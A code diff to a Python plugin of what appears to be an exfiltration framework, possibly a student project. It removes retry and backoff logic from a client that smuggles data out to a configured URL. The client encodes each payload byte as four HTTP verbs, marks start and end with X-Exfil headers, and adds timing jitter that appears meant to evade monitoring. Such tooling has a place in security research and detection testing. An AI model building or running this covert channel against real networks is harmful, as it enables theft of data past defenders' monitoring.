@@ -13,19 +13,10 @@ class HttpClientVerbSeq(ExfilClientPlugin):
     metodo = 2
     name = "http_client_verb_seq"
 
-    def _req(self, url: str, method: str, headers: dict, timeout: int, retries: int, backoff_ms: int) -> None:
-        last_exc: Exception | None = None
-        for attempt in range(retries + 1):
-            try:
-                req = urllib.request.Request(url=url, data=None, headers=headers, method=method)
-                with urllib.request.urlopen(req, timeout=timeout) as _:
-                    return
-            except Exception as e:
-                last_exc = e
-                if attempt >= retries:
-                    break
-                time.sleep(((2 ** attempt) * backoff_ms) / 1000.0)
-        raise last_exc  # type: ignore
+    def _req(self, url: str, method: str, headers: dict, timeout: int) -> None:
+        req = urllib.request.Request(url=url, data=None, headers=headers, method=method)
+        with urllib.request.urlopen(req, timeout=timeout) as _:
+            return
 
     def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
         url = config.get("url")
@@ -35,8 +26,6 @@ class HttpClientVerbSeq(ExfilClientPlugin):
         timeout    = int(config.get("timeout_s") or 10)
         user_agent = config.get("user_agent") or "TFG-Exfil/1.1"
         auth_token = config.get("auth_token")
-        retries    = int(config.get("retries") or 3)
-        backoff_ms = int(config.get("retry_backoff_ms") or 250)
         ritmo_base = int(config.get("ritmo_base_ms") or 0)
         ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
 
@@ -53,7 +42,7 @@ class HttpClientVerbSeq(ExfilClientPlugin):
         h = base_hdrs()
         h["X-Exfil-Start"] = "1"
         h["X-Exfil-Bytes"] = str(total_bytes)
-        self._req(url, "HEAD", h, timeout, retries, backoff_ms)
+        self._req(url, "HEAD", h, timeout)
 
         # 2) Enviar símbolos: cada byte → 4 verbos (2 bits por verbo, MSB primero)
         seq = 0
@@ -66,13 +55,13 @@ class HttpClientVerbSeq(ExfilClientPlugin):
                     time.sleep(max(0.0, (ritmo_base + jitter) / 1000.0))
                 h = base_hdrs()
                 h["X-Exfil-Seq"] = str(seq)
-                self._req(url, verb, h, timeout, retries, backoff_ms)
+                self._req(url, verb, h, timeout)
                 seq += 1
 
         # 3) EOT
         h = base_hdrs()
         h["X-Exfil-Last"] = "1"
-        self._req(url, "HEAD", h, timeout, retries, backoff_ms)
+        self._req(url, "HEAD", h, timeout)
 
         return {
             "ok": True,
